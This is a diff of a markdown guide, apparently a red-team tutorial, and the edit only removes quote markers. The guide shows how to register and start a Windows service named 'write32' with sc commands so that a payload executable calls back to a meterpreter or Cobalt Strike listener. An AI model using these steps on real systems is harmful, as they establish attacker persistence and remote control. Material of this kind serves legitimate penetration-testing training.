@@ -59,15 +59,15 @@ With the newly created Windows Service Executable, you can create a Windows serv
 ```bash
 sc create write32 binPath= "C:\-Path to service executable.exe"
 ```
->The 'write32' would be the process name we create, in this case we'll match the exectuable file.
+The 'write32' would be the process name we create, in this case we'll match the exectuable file.
 ```bash
 sc qc write32
 ```
->Verify that the we added the service and the right path is listed.
+Verify that the we added the service and the right path is listed.
 ```bash
 sc start write32
 ```
->After the service has started, check back your meterpreter shell or cobalt-strike listerner. SUCCESS!
+After the service has started, check back your meterpreter shell or cobalt-strike listerner. SUCCESS!
 
 Just want to make another note that there is a `difference` between a regular Windows Exectuable and a Windows Service Executable.
 
